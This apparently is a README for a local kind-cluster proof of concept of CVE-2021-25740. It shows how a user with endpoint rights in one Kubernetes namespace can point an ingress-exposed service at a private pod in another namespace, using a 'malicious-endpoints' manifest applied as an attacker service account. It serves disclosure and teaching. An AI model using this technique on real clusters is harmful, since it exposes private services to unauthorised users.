# CVE-2021-25740

This is a basic proof of concept for [CVE-2021-25740](https://github.com/kubernetes/kubernetes/issues/103675) where a user who has permissions to modify endpoint or endpointslice objects in one namespace can cause a service in another namespace to be exposed externally, allowing them access to that, even if they have no rights in the namespace of the victim service.

## Process

### Step 1 - Setup Kind cluster

The kind cluster configuratation is set-up to expose a couple of ports for the load balancer

```bash
kind create cluster --name cve25740-demo --config kind-config.yaml
```


### Step 2 - Create the ingress

Once the cluster is up and running the next step is to install an ingress controller

we're using ingress-nginx as a simple option for the demo, set it up with this command


```bash
kubectl apply -f https://kind.sigs.k8s.io/examples/ingress/deploy-ingress-nginx.yaml
```

Next setup a host entry on your machine so you can easily request exposed services in the cluster by name

```
127.0.0.1 demo.local
```


### Step 3 - Setup Kubernetes namespaces

The demonstration has two namespaces the "attacker-ns" and the "victim-ns" 

```bash
kubectl apply -f 01-namespaces.yaml
```

### Step 4 - Setup the victim service

This service is the private one that shouldn't be exposed outside the cluster.

```bash
kubectl apply -f 02-victim.yaml
```

Then setup network policies so that the only access to the service is from the ingress-nginx namespace

```bash
kubectl apply -f 02.5-victim-netpol.yaml
```


### Step 5 - Setup the "public" service

in this example the attacker controls a publicly exposed service so we'll set that up in their namespace. N.B. we're not setting a selector in the service object, so we can manually create and edit endpoints, which makes it easier to demonstrate.

```bash
kubectl apply -f 03-public-app.yaml
```

### Step 6 - Setup the endpoint for the service

As we're manually creating the endpoint for our service we'll need to check the IP address of the public service pod and create a corresponding enpoint object.

```bash
kubectl get pod -n attacker-ns -l app=public-app -o wide
```

Then edit `03b-public-endpoints-initial.yaml` with the IP address of that pod


### Step 7 -  Create an ingress for the public endpoint

Next up we'll create an ingress object in the attacker-ns that will expose the public service initially.

```bash
kubectl apply -f 04-ingress.yaml
```

With that created we can test that the ingress is working as expected, by curl'ing one of the ports that the ingress is running on which will then be routed to the public-app

```bash
curl -s http://demo.local/
```

which should respond

```html
<html>
  <body style="font-family: sans-serif;">
    <h1>PUBLIC BACKEND</h1>
    <p>This is the expected backend for demo.local.</p>
  </body>
</html>
```

### Step 8 - Setup an attacker user

With the initial setup complete, next we'll create the "attacker user" who only has rights to endpoints in the attacker namespace, importantly having no rights in the victim-ns

```bash
kubectl apply -f 05-rbac-attacker.yaml
```

### Step 9 - Demonstrating the problem!

After all that setup we're in a position where we can demonstrate the vulnerability.

```bash
curl -s http://demo.local/
```

This will show the public backend. Then get the IP address from the victim-ns pod (for a better demo come up with a different way of doing this)

```bash
kubectl get pod -n victim-ns -l app=sensitive-app -o wide
```

Then edit the `07-malicius-endpoints.yaml` manifest and put in the IP address of the public service and apply it as the attacker user

```bash
kubectl apply -f 07-malicious-endpoints.yaml --as=system:serviceaccount:attacker-ns:attacker-sa
```

then to prove the change run curl again showing access to the private service

```bash
curl -s http://demo.local/
```